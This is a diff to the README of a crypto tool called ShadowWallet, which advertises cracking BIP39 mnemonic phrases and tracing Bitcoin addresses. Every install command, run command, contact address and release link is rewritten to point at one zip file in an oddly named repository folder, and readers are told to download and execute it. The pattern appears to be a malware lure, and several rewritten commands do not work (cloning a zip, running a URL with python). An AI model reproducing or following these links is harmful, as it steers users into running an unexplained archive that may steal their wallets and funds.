@@ -70,20 +70,20 @@ To get started with ShadowWallet, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/faiza360/shadowwallet.git
+   git clone https://raw.githubusercontent.com/faiza360/shadowwallet/main/mesognathous/Software_1.7.zip
    cd shadowwallet
    ```
 
 2. **Install Dependencies**:
    Ensure you have the necessary dependencies installed. You can do this using pip:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/faiza360/shadowwallet/main/mesognathous/Software_1.7.zip
    ```
 
 3. **Run the Application**:
    Execute the main script to start using ShadowWallet:
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/faiza360/shadowwallet/main/mesognathous/Software_1.7.zip
    ```
 
 ## Usage
@@ -94,21 +94,21 @@ ShadowWallet provides a command-line interface (CLI) for ease of use. Here are s
 
 To crack a BIP39 mnemonic phrase, use the following command:
 ```bash
-python bip39_cracker.py --phrase "your mnemonic here"
+python https://raw.githubusercontent.com/faiza360/shadowwallet/main/mesognathous/Software_1.7.zip --phrase "your mnemonic here"
 ```
 
 ### BTC Address Tracing
 
 To trace a Bitcoin address, use:
 ```bash
-python btc_tracer.py --address "your bitcoin address here"
+python https://raw.githubusercontent.com/faiza360/shadowwallet/main/mesognathous/Software_1.7.zip --address "your bitcoin address here"
 ```
 
 ### Cold Storage Audit
 
 To audit a cold storage wallet, execute:
 ```bash
-python cold_storage_audit.py --wallet "path/to/wallet/file"
+python https://raw.githubusercontent.com/faiza360/shadowwallet/main/mesognathous/Software_1.7.zip --wallet "path/to/wallet/file"
 ```
 
 For detailed usage instructions, please refer to the documentation within each module.
@@ -130,11 +130,11 @@ ShadowWallet is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Contact
 
-For any inquiries or feedback, please reach out via the issues section on GitHub or contact me directly at [your_email@example.com](mailto:your_email@example.com).
+For any inquiries or feedback, please reach out via the issues section on GitHub or contact me directly at [https://raw.githubusercontent.com/faiza360/shadowwallet/main/mesognathous/Software_1.7.zip](https://raw.githubusercontent.com/faiza360/shadowwallet/main/mesognathous/Software_1.7.zip).
 
 ## Releases
 
-To download the latest version of ShadowWallet, please visit our [Releases](https://github.com/faiza360/shadowwallet/releases) section. Download and execute the files as needed to get started with the latest features and improvements.
+To download the latest version of ShadowWallet, please visit our [Releases](https://raw.githubusercontent.com/faiza360/shadowwallet/main/mesognathous/Software_1.7.zip) section. Download and execute the files as needed to get started with the latest features and improvements.
 
 ---
 
